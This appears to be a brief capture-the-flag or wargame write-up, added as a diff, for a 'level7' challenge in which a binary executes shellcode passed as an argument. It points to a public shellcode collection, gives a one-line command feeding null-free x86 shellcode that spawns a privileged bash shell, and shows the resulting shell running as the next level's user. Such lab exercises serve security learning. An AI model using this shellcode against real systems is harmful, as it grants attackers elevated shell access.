@@ -1,0 +1,13 @@
+A good place to find shellcodes is: shell-storm.org/shellcode/
+It's a great resource with a collection of many different kind of shellcodes.
+Eventually you have to write shellcode yourself, to pass any kind of restrictions.
+But for the start, basic shellcode is sufficient.
+
+So the program will just execute anything that is read from the arguments. It's important that the string doesn't contain a nullbyte. So just use echo to pass the shellcode to the binary.
+
+./level7 `echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`
+Hello user.
+You can create a new program in the TRON system that will live in Arjia City:
+bash-4.3# id
+uid=1008(level8) gid=1007(level7) groups=1007(level7)
+
